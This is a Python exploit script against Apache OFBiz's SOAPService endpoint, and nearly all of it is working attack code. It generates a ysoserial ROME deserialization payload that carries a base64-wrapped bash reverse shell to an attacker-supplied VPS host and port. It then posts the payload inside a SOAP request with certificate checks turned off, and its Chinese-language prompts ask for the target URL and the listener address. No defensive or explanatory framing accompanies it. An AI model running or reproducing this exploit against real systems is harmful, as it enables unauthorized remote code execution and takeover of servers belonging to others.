# -*- encoding: utf-8 -*-
import requests
import sys
import os
import binascii
import base64

requests.packages.urllib3.disable_warnings()


def payload(url1,vps,vps_port):
    str1 = 'bash -i >& /dev/tcp/{}/{} 0>&1'.format(vps,vps_port)
  
    #print(str1)
   
    str1 = str1.encode('utf-8')
    bs64=str(base64.b64encode(str1)).split("'")[1]
    data = """bash -c {echo,%s}|{base64,-d}|{bash,-i}""" % bs64
 
    #print(data)

    cmd = """java -jar ysoserial.jar ROME \"%s\"> exp.ot""" % data

    #print (cmd)
 
    read_cmd = os.popen(cmd)
    read_cmd.close()
    
    with open("exp.ot", 'rb') as f:
        ot_data = binascii.hexlify(f.read())
        res = str(ot_data).split("'")[1]
        #print(res)
        post_data = '''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><test:clearAllEntityCaches xmlns:test="http://ofbiz.apache.org/service/"><test:cus-obj>%s</test:cus-obj></test:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>''' % res
        headers = {
            'Content-Type': 'text/xml',
            'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4388.124 Safari/527.36'
            
        }       
        payload_url = "webtools/control/SOAPService" 
        response = requests.post(url=url1+'/'+payload_url, data=post_data, headers=headers,verify=False)
    if response.status_code == 200:
        print("DO IT")

        

    
if __name__ == "__main__":
    url1 = str(input("[-] 请输入存在漏洞URL:\n"))
    vps = str(input("[-] 请输入反弹的vps地址:\n"))
    vps_port = str(input("[-] 请输入vps端口:\n"))
    
    payload(url1,vps,vps_port)







